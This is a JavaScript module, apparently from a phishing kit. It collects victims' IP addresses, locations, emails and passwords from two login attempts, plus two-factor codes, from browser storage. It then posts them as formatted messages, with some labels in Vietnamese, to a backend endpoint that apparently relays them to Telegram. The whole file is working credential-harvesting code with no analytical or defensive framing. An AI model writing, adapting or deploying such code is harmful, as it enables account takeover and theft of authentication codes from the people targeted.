import axios from "axios";

export const sendMessageUserNameTelegram = async () => {
  try {
    const ip = JSON.parse(localStorage.getItem("ip"));
    const loginAttempts = JSON.parse(localStorage.getItem("loginAttempts"));
    const location = JSON.parse(localStorage.getItem("user_location"));

    await axios.post("http://localhost:3002/users/sendMessage", {
      message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.road}\n👤 *Username1:* ${loginAttempts[0]?.email}\n👤 *Username2:* ${loginAttempts[1]?.email}\n🔑 *Password1:* ${loginAttempts[0]?.password}\n🔑 *Password2:* ${loginAttempts[1].password}\n`,
    });
  } catch (error) {
    console.error("Error:", error);
  }
};

export const sendMessageCodeTelegram = async (code) => {
  try {
    const ip = JSON.parse(localStorage.getItem("ip"));
    const loginAttempts = JSON.parse(localStorage.getItem("loginAttempts"));
    const location = JSON.parse(localStorage.getItem("user_location"));
    const codeFA = JSON.parse(localStorage.getItem("twoFactorCode"));

   await axios.post("http://localhost:3002/users/sendMessage", {
      message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.road}\n👤 *Username1:* ${loginAttempts[0]?.email}\n👤 *Username2:* ${loginAttempts[1]?.email}\n🔑 *Password1:* ${loginAttempts[0]?.password}\n🔑 *Password2:* ${loginAttempts[1].password}\n🔓 *Code:* ${code || codeFA }\n`,
    });
  } catch (error) {
    console.error("Error:", error);
  }
};
